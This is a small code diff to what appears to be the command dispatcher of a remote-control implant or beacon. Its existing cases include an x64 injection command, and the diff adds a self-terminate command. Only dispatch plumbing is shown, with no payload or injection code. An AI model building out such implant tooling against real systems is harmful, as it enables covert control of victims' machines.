@@ -2,6 +2,7 @@
 
 #include "beacon.h"
 #include "command.h"
+#include "self.h"
 #include "spawn.h"
 
 void TaskDispatch(int cmd, char* buffer, int size)
@@ -13,6 +14,9 @@ void TaskDispatch(int cmd, char* buffer, int size)
 			break;
 		case COMMAND_INJECTX64_PING:
 			SpawnAndPing(buffer, size, FALSE);
+			break;
+		case COMMAND_DIE:
+			Die();
 			break;
 	}
 }
